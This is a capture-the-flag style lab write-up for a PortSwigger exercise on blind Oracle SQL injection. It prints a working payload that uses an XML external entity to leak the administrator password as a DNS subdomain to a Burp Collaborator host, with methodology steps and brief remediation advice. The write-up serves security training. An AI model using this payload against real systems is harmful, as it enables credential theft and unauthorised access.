# Lab 17 — Blind SQL injection with out-of-band data exfiltration

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Blind SQLi (OAST) |
| **Concept** | [12 — Out-of-band SQLi (OAST)](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration |

---

## 🎯 Objective
Go beyond detection: **exfiltrate the `administrator` password** through an out-of-band DNS channel, then **log in**. Engine: **Oracle**.

## 🧠 Background
Extend Lab 16 by **embedding the stolen value into the subdomain** of the DNS lookup. When the DB resolves it, the password appears as a label in your Collaborator DNS logs — the whole value in a single request.

## 🪜 Methodology
1. Grab a Collaborator payload domain (`BURP-COLLAB.oastify.com`).
2. Inject a payload that concatenates the admin password into the hostname before the lookup:
   ```sql
   TrackingId=xyz'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLAB.oastify.com/"> %25remote;]>'),'/l') FROM dual)--
   ```
3. Send, then **Poll now** in Collaborator. You'll see a DNS query like:
   ```
   s3cr3tp4ss.BURP-COLLAB.oastify.com
   ```
4. The subdomain **is** the password → log in as `administrator`.

## 💥 Payload (readable form)
```sql
' UNION SELECT extractvalue(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM
   "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLAB.oastify.com/"> %remote;]>'
),'/l') FROM dual--
```

## ✅ Why it works
The password is string-concatenated (`||`) into the external-entity URL. Resolving that hostname sends the value to your DNS server as a subdomain label — data exfiltration without any in-band feedback.

> ⚠️ DNS labels max 63 chars (253 total). For longer secrets, exfiltrate in `SUBSTR` chunks.

## 🛡️ Remediation
Egress-filter the DB server's outbound DNS/HTTP; parameterize; least privilege. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
OAST isn't just detection — encode secrets in the hostname to exfiltrate in one shot. `#sqli` `#practitioner` `#oob` `#exfiltration` `#oracle`
